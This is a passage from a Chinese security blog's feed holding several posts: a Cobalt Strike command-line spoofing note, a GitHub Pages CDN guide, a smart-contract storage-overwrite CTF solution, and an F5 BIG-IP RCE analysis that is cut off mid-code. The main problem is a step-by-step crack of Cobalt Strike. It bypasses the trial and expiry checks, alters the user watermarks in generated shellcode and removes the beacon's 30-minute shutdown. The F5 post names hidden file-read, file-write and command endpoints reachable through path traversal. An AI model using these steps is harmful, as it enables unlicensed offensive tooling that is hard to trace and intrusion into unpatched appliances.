href="#思考" class="headerlink" title="思考"></a>思考</h2><p>同这篇文章一起的还有<a href="https://blog.nviso.eu/2020/01/31/the-return-of-the-spoof-part-1-parent-process-id-spoofing/" target="_blank" rel="noopener">父进程ID欺骗</a>，这两个手段结合一起生成一个易用 exe 应该是很有效的红队手段，比如随机生成伪装命令、自动伪装，这样在来不及清理历史记录的情况下也能延缓蓝队的步伐…</p><p>但是奈何不会 c++，先留个坑</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/" target="_blank" rel="noopener">How to Argue like Cobalt Strike</a></li><li><a href="https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/" target="_blank" rel="noopener">The return of the spoof part 2: Command line spoofing</a></li><li><a href="youtube.com/watch?v=l8nkXCOYQC4">Red Teaming in the EDR age</a></li><li><a href="http://journal.seu.edu.cn/oa/pdfdow.aspx?Sid=201301005" target="_blank" rel="noopener">基于直接内核对象操作的进程伪装保护方法</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;突然好奇 argue 原理，于是有了此文&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>Github Page 加速</title>
    <link href="https://blog.sari3l.com/posts/afd91327/"/>
    <id>https://blog.sari3l.com/posts/afd91327/</id>
    <published>2020-08-01T16:54:48.000Z</published>
    <updated>2020-08-05T11:24:19.935Z</updated>
    
    <content type="html"><![CDATA[<p>今天实在被 github page 的加载速度恶心到了，测试了几个CDN效果，虽然有免费流量等活动，总感觉被收割了什么</p><p>中间测试了 netlify，开始对它速度不是很满意，但之后测试了几个还是回到了它，Orz</p><p>最终配合利用各种手段还算是达到了收费 CDN 的效果(有项目体量限制)🤣</p><p><strong>建议jsdelivr只做 JS、CSS 加速就好，毕竟好用的公共库用一个少一个</strong></p><ol><li>netlify - 资源托管、cdn 加速</li><li>cloudflare - cdn 加速</li><li>lazyload - 图片异步延迟加载</li><li>jsdelivr - 静态资源加速</li></ol><h2 id="1-Netlify"><a href="#1-Netlify" class="headerlink" title="1. Netlify"></a>1. Netlify</h2><ol><li><p>选择访问 github 仓库</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962888273340.jpg" alt="-w1241"></p></li><li><p>选择 github page 项目</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962967632283.jpg" alt="-w1246"></p></li><li><p>因为上传至github page为静态页面不需要编译，这里选择直接部署即可</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962968325497.jpg" alt="-w1238"></p></li><li><p>配置 netlify 域名解析</p><p> 这里正常情况 primary domain 应为绿色表示<code>正常状态</code>，但由于开启了 cloudflare cdn 导致 DNS 检测异常，检测能正常访问忽略此警告</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962974152636.jpg" alt="-w1222"></p></li><li><p>配置SSL/TLS证书</p><p> 由于我在 Netlify 前面使用 CloudFlare CDN，所以需要配合 CF 进行证书认证，非 CF 可以尝试右边的<code>Let&#39;s Encrypt</code>证书（这里我已经添加了证书，所以选择更新自定义内容证书）</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962977185708.jpg" alt="-w957"></p><p> i. 先在 CF 创建<code>源证书</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962979813348.jpg" alt="-w1086"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962980996211.jpg" alt="-w825"></p><p> ii. 之后生成 PEM 格式密钥，记录源证书为 1，私钥为 2</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962981679521.jpg" alt="-w819"></p><p> iii. 访问<a href="https://support.cloudflare.com/hc/zh-cn/articles/115000479507" target="_blank" rel="noopener">此页面(管理 Cloudflare Origin CA 证书)</a>，记录根证书为 3</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962983204747.jpg" alt="-w894"></p><p> iv. 回到 Netlify，按上面对应序号填写证书内容后保存</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962977767693.jpg" alt="-w638"></p></li></ol><h2 id="2-CloudFlare"><a href="#2-CloudFlare" class="headerlink" title="2. CloudFlare"></a>2. CloudFlare</h2><ol><li><p>配置 CNAME 指向 Netlify 自定义域名，并开启 CDN 加速</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962987471338.jpg" alt="-w1038"></p></li><li><p>选择加密模式为<code>完全</code>或<code>完全（严格）</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962988163771.jpg" alt="-w1065"></p></li><li><p>开启<code>Always HTTPS</code>和 <code>HSTS</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962988791773.jpg" alt="-w1047"></p></li></ol><h2 id="3-lazy-load"><a href="#3-lazy-load" class="headerlink" title="3. lazy load"></a>3. lazy load</h2><p>项目地址：<a href="https://github.com/Troy-Yang/hexo-lazyload-image" target="_blank" rel="noopener">https://github.com/Troy-Yang/hexo-lazyload-image</a></p><p>按文档安装、配置即可</p><pre class=" language-shell"><code class="language-shell">$ npm install hexo-lazyload-image --save</code></pre><h2 id="4-jsdelivr"><a href="#4-jsdelivr" class="headerlink" title="4. jsdelivr"></a>4. jsdelivr</h2><p><strong>由于jsdelivr自带 50M 项目限制，所以全局加速是不现实的（此处项目较小的可以全局使用），建议只加速 JS、CSS 即可，下面只做理论介绍</strong></p><p>官网：<a href="https://www.jsdelivr.com/?docs=gh" target="_blank" rel="noopener">https://www.jsdelivr.com/?docs=gh</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962991108849.jpg" alt="-w1171"></p><ol><li><p>由于我配置了 hexo-lazyload-image，所以直接粗暴的修改源码（这里只对应 posts 文章内的静态资源），代价就是本地测试没法加载图片，有能力的可以写个测试和发布分别加载不同地址即可</p><p> 位置：<code>&lt;blog_path&gt;/node_modules/hexo-asset-image/index.js</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962992328798.jpg" alt="-w1087"></p></li><li><p>对应其他静态文件，如头像、二维码等，直接修改成绝对地址即可（不利于长期维护）</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/afd91327/15962997100660.jpg" alt="-w692"></p></li></ol><p>P.S. 其实可以自定义在 config 中自定义一个开关和加载路径方便未来维护，这里有插件<a href="https://www.npmjs.com/package/hexo-cdn-jsdelivr" target="_blank" rel="noopener">hexo-cdn-jsdelivr</a>实现，本地测试没有问题但是generate时总会出错，可能和其他插件有冲突，我暂时没有去仔细研究</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w" target="_blank" rel="noopener">https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;快快快，冲冲冲~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike 破解步骤</title>
    <link href="https://blog.sari3l.com/posts/76ce816c/"/>
    <id>https://blog.sari3l.com/posts/76ce816c/</id>
    <published>2020-07-31T02:51:55.000Z</published>
    <updated>2022-01-05T13:35:45.540Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><p>由于到手的非原版，可能有些错误的地方、没有破解到的位置，欢迎各位师傅指正~~</p><h2 id="必须"><a href="#必须" class="headerlink" title="必须"></a>必须</h2><h3 id="1-试用版"><a href="#1-试用版" class="headerlink" title="1. 试用版"></a>1. 试用版</h3><p>位置：<code>common.License#isTrial</code><br>作用：验证是否为试用版<br>方式：直接修改返回为<code>false</code></p><p><strong>注意：此修改可能严重影响 <a href="#toc_0">XOR 混淆</a>、<a href="#toc_4">试用限制</a></strong></p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961024247042.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961024667166.jpg" alt></td></tr></tbody></table><h3 id="2-过期时间"><a href="#2-过期时间" class="headerlink" title="2. 过期时间"></a>2. 过期时间</h3><p>位置：<code>common.Authorization#Authorization</code><br>作用：验证是否超出许可时间<br>方式：直接修改<code>this.validto</code>为<code>forever</code></p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961597576668.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961597913280.jpg" alt></td></tr></tbody></table><h3 id="3-水印"><a href="#3-水印" class="headerlink" title="3. 水印"></a>3. 水印</h3><p>位置：<code>common.Authorization</code><br>作用：用于添加用户水印(暗桩)<br>方式：在读取语句后赋值 watermask ∈ (0, 65535)</p><p><strong>注意：此修改可能影响 <a href="#toc_1">试用信息</a>、<a href="#toc_2">用户(暗桩)信息</a></strong></p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961040337059.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961055351722.jpg" alt></td></tr></tbody></table><p>水印举例：生成 x86-64 c shellcode 时候末尾 4 字节</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961636924685.jpg" alt></p><h3 id="4-30分钟Exit"><a href="#4-30分钟Exit" class="headerlink" title="4. 30分钟Exit"></a>4. 30分钟Exit</h3><p>位置：<code>beacon.BeaconData#shouldPad</code><br>作用：在<code>beacon.BeaconC2#BeaconC2</code>中引用，将 beacon 存活 30 分钟后强制下线<br>方式：修改<code>this.shouldPad</code>为<code>false</code></p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961050497733.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961050650578.jpg" alt></td></tr></tbody></table><h2 id="可选"><a href="#可选" class="headerlink" title="可选"></a>可选</h2><h3 id="1-XOR-Encode"><a href="#1-XOR-Encode" class="headerlink" title="1. XOR Encode"></a>1. <a name="toc_0">XOR Encode</a></h3><p>位置：<code>common.ArtifactUtils#XorEncode</code><br>作用：用于shellcode混淆<br>方式：需检查<code>resources</code>中存在有<code>xor.bin</code>、<code>xor64.bin</code>，没有bin文件版本直接返回即可</p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961025454087.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961608497137.jpg" alt></td></tr></tbody></table><h3 id="2-试用信息"><a href="#2-试用信息" class="headerlink" title="2. 试用信息"></a>2. <a name="toc_1">试用信息</a></h3><ol><li>位置：<code>common.BaseArtifactUtils#_patchArtifact</code><br> 作用：添加试用信息暗桩，受<code>License.isTrial()</code>控制<br> 方式：直接删除、注释即可</li></ol><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961018283418.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961020776620.jpg" alt></td></tr></tbody></table><ol start="2"><li>位置：<code>common.ListenerConfig#pad</code><br> 作用：在 shellcode 中添加试用信息暗桩，受<code>common.Authorization#watermark</code>控制<br> 方式：直接注释即可；或按上述信息修改 watermask</li></ol><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961019372253.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961609672994.jpg" alt></td></tr></tbody></table><h3 id="3-试用限制"><a href="#3-试用限制" class="headerlink" title="3. 试用限制"></a>3. <a name="toc_4">试用限制</a></h3><p>基本受 isTrial 影响，建议按上述信息修改 isTrial 逻辑</p><p>受影响文件：</p><ul><li>aggressor/Aggressor</li><li>aggressor/AggressorClient</li><li>aggressor/bridges/ArtifactBridge</li><li>c2profile/Preview</li><li>common/ArtifactUtils</li><li>common/BaseArtifactUtils</li><li>common/CommonUtils</li><li>common/MudgeSanity</li></ul><h3 id="4-用户-暗桩-信息"><a href="#4-用户-暗桩-信息" class="headerlink" title="4. 用户(暗桩)信息"></a>4. <a name="toc_2">用户(暗桩)信息</a></h3><p>基本受 watermask 影响，建议按上述信息修改 watermask</p><p>受影响文件：</p><ul><li>beacon/BeaconPayload.java</li><li>setup/SSHAgent.java</li><li>common/AuthUtil.java</li><li>common/ListenerConfig.java</li><li>server/TeamServer.java</li><li>stagers/BeaconPipeStagerX86.java</li><li>stagers/ForeignReverseStagerX64.java</li><li>stagers/ForeignReverseStagerX86.java</li><li>stagers/GenericBindStager.java</li><li>stagers/GenericDNSStagerX86.java</li><li>stagers/GenericHTTPStager.java</li></ul><h3 id="5-证书有效性"><a href="#5-证书有效性" class="headerlink" title="5. 证书有效性"></a>5. 证书有效性</h3><p>位置：<code>common.Authorization</code><br>作用：验证 auth 文件有效性标志<br>修改：如若 auth 有效(存在、生成)，则无需改动；或直接修改初始化值为 true</p><table><thead><tr><th align="center">修改前</th><th align="center">修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961614129898.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961614352600.jpg" alt></td></tr></tbody></table><h2 id="未知"><a href="#未知" class="headerlink" title="未知"></a>未知</h2><h3 id="1-身份验证"><a href="#1-身份验证" class="headerlink" title="1. 身份验证"></a>1. 身份验证</h3><p>位置：<code>common.AuthUtil</code><br>作用：读取 auth 文件中身份内容<br>方式：到手的代码好像被改动了，没有看到引用这个类的地方，导致不知道到底作用于哪里，尤其是licensekey</p><table><thead><tr><th align="center">(试)修改前</th><th align="center">(试)修改后</th></tr></thead><tbody><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961600297168.jpg" alt></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/76ce816c/15961602969398.jpg" alt></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文章仅做技术学习交流，请支持、使用正版软件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif&quot; data-original=&quot;/posts/76ce816c/icon.jpg&quot; alt=&quot;icon&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>一道题回顾智能合约 Coverage</title>
    <link href="https://blog.sari3l.com/posts/b7ea5c49/"/>
    <id>https://blog.sari3l.com/posts/b7ea5c49/</id>
    <published>2020-07-13T08:32:42.000Z</published>
    <updated>2022-01-05T13:35:54.979Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class=" language-solidity"><code class="language-solidity">pragma solidity ^ 0.4 .24;contract Hash {    bytes32 question = "";    struct Game {        bytes32 slogan;        address owner;        uint96 times;        address player;        bool ready;    }    Game game;    modifier onlyOwner() {        require(msg.sender == game.owner, "Illegal user!");        _;    }    modifier onlyPlayer() {        require(msg.sender == game.player, "Illegal user!");        _;    }    constructor(string hash) public {        question = keccak(hash);        game.slogan = "Welcome to imagin's Hash World!";        game.owner = msg.sender;    }    function getFlag() view public returns(bool) {        return (game.times == 43856731668828204536206669571);    }    function play() public {        require(game.player == address(0), "Have been played!");        game.player = address(msg.sender);    }    function guessHash(string answer) public onlyPlayer payable returns(string) {        game.player = msg.sender;        require(msg.value > 0.1 ether, "Get yourself rich first.");        require(game.ready);        game.ready = false;        require(isMan(), "You should be real man.");        if (keccak(answer) == question) {            game.times++;            return "Congratulations, you're right~";        } else {            game.times--;            return "Oops, you lost your chance (-1s).";        }    }    function changeSlogen(bytes32 slogan) public {        Game a;        a.slogan = slogan;        game = a;    }    function nextHash(string hash) public onlyOwner {        question = keccak256(hash);        game.ready = true;    }    function keccak(string str) internal pure returns(bytes32) {        return keccak256(str);    }    function getSlogan() view public returns(bytes32) {        return game.slogan;    }    function isMan() internal view returns(bool) {        uint size;        assembly { size: = extcodesize(caller) }        return (size == 0);    }    // 方便调试，原题目以下函数不存在    function getquestion() view public returns(bytes32) {        return question;    }    function getTime() view public returns(uint96) {        return game.times;    }    function getOwner() view public returns(address) {        return game.owner;    }}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注意到，题目提供了</p><ul><li>3 个公开传参方法分别为<code>changeSlogen</code>、<code>guessHash</code>、<code>nextHash</code></li><li>2 个公开无参方法分别为<code>play</code>、<code>getFlag</code></li></ul><p>首先我们看 getFlag 方法，最终目标是让它返回 true，而对应的目标 times 为<br>43856731668828204536206669571<sub>(10)</sub> == 8db5702bac41153c09c73703<sub>(16)</sub></p><p>这个 times(次数) 是通过 guessHash 进行调整的，但是根本不可能在有限时间内通过循环操作来达到，尤其是这个函数还有onlyPlayer payable修饰，另外内部还有 isMan 的合约调用检测，只能手工来操作实现</p><p>我们抛开题目，先来看下guessHash的代码逻辑，可以看到通过一堆检测后，其主要内容就是实现对answer和question的等值判断，之后对 times 进行 +- 操作</p><pre class=" language-solidity"><code class="language-solidity">function guessHash(string answer) public onlyPlayer payable returns(string) {    game.player = msg.sender;    require(msg.value > 0.1 ether, "Get yourself rich first.");    require(game.ready);    game.ready = false;    require(isMan(), "You should be real man.");    if (keccak(answer) == question) {        game.times++;        return "Congratulations, you're right~";    } else {        game.times--;        return "Oops, you lost your chance (-1s).";    }}</code></pre><p>粗略想想，应该有两种解题方向</p><ol><li>爆破 times</li><li>控制 times 然后通过操作 guessHash 进行调整</li></ol><p>上面提到无法通过合约爆破形式使 times 暴增，而且题目实际上同时几个人在做，如果中间有人参一脚修改了 times同时攻击者有没有发觉，则会导致前功尽弃，难以控制</p><p>那我们只能看第二种方法能否实现</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li><a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/" target="_blank" rel="noopener">Understanding Ethereum Smart Contract Storage</a></li><li><a href="https://learnblockchain.cn/books/geth/part7/storage.html" target="_blank" rel="noopener">详解Solidity合约数据存储布局</a></li><li><a href="https://www.freebuf.com/articles/blockchain-articles/175237.html" target="_blank" rel="noopener">Solidity中存储方式错误使用所导致的变量覆盖</a></li><li><a href="https://xz.aliyun.com/t/7152" target="_blank" rel="noopener">智能合约审计系列————3、变量覆盖&amp;不一致性检查</a></li></ol><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们向 changeSlogen 传入<code>0x0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffff</code>来观察下结构体值的变化，可以看到所有值全部被修改了</p><p>尤其注意此时 times 为 80596284442678810400085<sub>(10)</sub> == 11112222333344445555<sub>(16)</sub></p><table><thead><tr><th>调用前</th><th>调用后</th></tr></thead><tbody><tr><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b7ea5c49/15946106443678.jpg" alt="-w668"></td><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b7ea5c49/15946106229853.jpg" alt="-w667"></td></tr></tbody></table><p>根据占位符，我们可以快速确定如何填充数据，通过修改 times 然后进行 +- 操作就可以完成解题了</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li>执行 changeSlogen 传入 <code>0x8db5702bac41153c09c737040000000000000000000000000000000000000000</code>，修改 times 为 43856731668828204536206669572<sub>(10)</sub></li><li>执行 play 成为当前玩家</li><li>执行 guessHash 传入 <code>任意值</code> 导致 times - 1</li><li>执行 getFlag</li></ol><p>题目地址：0x299DfDB000C6c0131D4cEe84348e6B5Fb656Fff8</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b7ea5c49/15946124317620.jpg" alt="-w682"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自于小伙伴分享的题目，正好回顾下&lt;code&gt;变量覆盖&lt;/code&gt;的原理、利用&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="智能合约" scheme="https://blog.sari3l.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>F5 BIG-IP RCE简单分析</title>
    <link href="https://blog.sari3l.com/posts/58a67794/"/>
    <id>https://blog.sari3l.com/posts/58a67794/</id>
    <published>2020-07-06T02:45:39.000Z</published>
    <updated>2020-07-08T07:00:40.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从通告中可以明确几个点</p><ol><li>位于 tmui</li><li><code>..;</code>路径穿透 -&gt; Apache Tomcat</li><li>隐藏页面</li></ol><p>虚拟机中提取源码并简单分析后可以确定jsp对应class位于</p><pre class=" language-shell"><code class="language-shell"># 相对路径/www/tmui/WEB-INF/classes/org/apache/jsp/tmui# 绝对路径/usr/local/www/tmui/WEB-INF/classes/org/apache/jsp/tmui</code></pre><p>最后在 locallb/workspace 中可以看到有以下几个关键类</p><table><thead><tr><th>class</th><th>jsp path</th><th>feature</th><th>parameter</th></tr></thead><tbody><tr><td>create_jsp.class</td><td>/tmui/locallb/workspace/list.jsp</td><td>创建 jsp 文件</td><td></td></tr><tr><td>dbquery_jsp.class</td><td>/tmui/locallb/workspace/dbquery.jsp</td><td>查询数据库</td><td>query<br>object<br>column</td></tr><tr><td>directoryList_jsp.class</td><td>/tmui/locallb/workspace/directoryList.jsp</td><td>列目录</td><td>directoryPath</td></tr><tr><td>fileRead_jsp.class</td><td>/tmui/locallb/workspace/fileRead.jsp</td><td>读文件</td><td>fileName</td></tr><tr><td>fileSave_jsp.class</td><td>/tmui/locallb/workspace/fileSave.jsp</td><td>写文件</td><td>fileName<br>content</td></tr><tr><td>import_jsp.class</td><td>/tmui/locallb/workspace/import.jsp</td><td>加载 jsp 文件</td><td></td></tr><tr><td>list_jsp.lass</td><td>/tmui/locallb/workspace/list.jsp</td><td>列数据库信息</td><td></td></tr><tr><td>properties_jsp.class</td><td>/tmui/locallb/workspace/properties.jsp</td><td>参数设定</td><td>pageType<br>properties</td></tr><tr><td>settings_jsp.class</td><td>/tmui/locallb/workspace/settings.jsp</td><td>列举参数信息</td><td></td></tr><tr><td>tmshCmd_jsp.class</td><td>/tmui/locallb/workspace/tmshCmd.jsp</td><td>命令执行</td><td>command</td></tr></tbody></table><p>对应<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils</code>中的方法实现</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/58a67794/15940163972331.jpg" alt></p><p>在浏览器中直接访问加载这些页面会被重定向，但通过 tomcat 路径穿透可以控制在 tmui 下进行加载</p><p>然后这里说下 tmshCmd 执行的问题</p><p>在<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand</code>中执行传入的 command，但限制可用的操作为<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>四种模块，且由于<code>checkForBadShellCharacters</code>进行了过滤，需要找到方法跳出限制通过<a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/run.html" target="_blank" rel="noopener"><code>run</code>模块</a>执行 bash 命令</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">runTmshCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    F5Logger logger <span class="token operator">=</span> <span class="token punctuation">(</span>F5Logger<span class="token punctuation">)</span>F5Logger<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>WorkspaceUtils<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JSONObject resultObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String error <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String operation <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ShellCommandValidator<span class="token punctuation">.</span><span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"create"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"modify"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        error <span class="token operator">=</span> NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.RejectedTmshCommand"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>            Result result <span class="token operator">=</span> Syscall<span class="token punctuation">.</span><span class="token function">callElevated</span><span class="token punctuation">(</span>Syscall<span class="token punctuation">.</span>TMSH<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            output <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token 